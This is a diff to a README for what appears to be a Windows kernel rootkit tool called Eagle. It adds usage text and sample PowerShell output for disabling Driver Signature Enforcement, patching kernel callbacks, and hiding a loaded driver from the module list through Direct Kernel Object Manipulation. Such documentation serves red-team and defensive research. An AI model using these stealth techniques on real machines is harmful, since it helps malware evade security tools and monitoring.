@@ -29,6 +29,7 @@ OPTIONS:
 
 SUBCOMMANDS:
     callbacks
+    driver
     dse
     help         Print this message or the help of the given subcommand(s)
     process
@@ -60,6 +61,32 @@ OPTIONS:
     -e, --enumerate        Enumerate kernel callbacks
     -h, --help             Print help information
     -p, --patch <PATCH>    Patch kernel callbacks 0-63
+```
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe dse -h
+client.exe-dse
+
+USAGE:
+    client.exe dse <--enable|--disable>
+
+OPTIONS:
+    -d, --disable    Disable Driver Signature Enforcement (DSE)
+    -e, --enable     Enable Driver Signature Enforcement (DSE)
+    -h, --help       Print help information
+```
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe driver -h
+client.exe-driver
+
+USAGE:
+    client.exe driver <--hide|--enumerate>
+
+OPTIONS:
+    -e, --enumerate    Enumerate loaded kernel modules
+    -h, --help         Print help information
+        --hide         Hide a driver using Direct Kernel Object Manipulation (DKOM)
 ```
 
 ## Example 1: Enumerate and patch kernel callbacks
@@ -151,6 +178,42 @@ PS C:\Users\memn0ps\Desktop> .\client.exe process --name powershell.exe --hide
 
 ![CMD](./cmd_hide2.png)
 
+
+## Hide Driver
+
+Hidden from ZwQuerySystemInformation and PsLoadedModuleList
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe driver --enumerate
+Total Number of Modules: 185
+[0] 0xfffff80058c00000 "ntoskrnl.exe"
+[1] 0xfffff80054d20000 "hal.dll"
+<..OMITTED..>
+[180] 0xfffff80054600000 "KERNEL32.dll"
+[181] 0xfffff80054200000 "ntdll.dll"
+[182] 0xfffff800553f0000 "KERNELBASE.dll"
+[183] 0xfffff800556f0000 "MpKslDrv.sys"
+[184] 0xfffff80055720000 "Eagle.sys"
+[+] Loaded modules enumerated successfully
+```
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe driver --hide
+[+] Driver hidden successfully
+```
+
+```
+PS C:\Users\memn0ps\Desktop> .\client.exe driver --enumerate
+Total Number of Modules: 184
+[0] 0xfffff80058c00000 "ntoskrnl.exe"
+[1] 0xfffff80054d20000 "hal.dll"
+<..OMITTED..>
+[180] 0xfffff80054600000 "KERNEL32.dll"
+[181] 0xfffff80054200000 "ntdll.dll"
+[182] 0xfffff800553f0000 "KERNELBASE.dll"
+[183] 0xfffff800556f0000 "MpKslDrv.sys"
+[+] Loaded modules enumerated successfully
+```
 
 
 ## [Install Rust](https://www.rust-lang.org/tools/install)
